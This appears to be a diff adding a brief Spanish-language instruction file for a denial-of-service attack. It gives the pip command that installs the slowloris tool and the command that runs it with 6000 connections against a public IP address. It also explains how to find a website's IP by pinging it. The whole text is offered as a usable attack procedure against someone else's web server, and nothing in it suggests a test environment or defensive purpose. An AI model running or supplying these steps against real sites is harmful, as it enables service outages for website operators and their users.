@@ -1,0 +1,7 @@
+Para instalar: 
+pip3 install slowloris 
+
+Para ajacutar 
+slowloris -s 6000 <IP publica>
+
+Para obtener la ip publica, necesitas hacer un ping a esa web
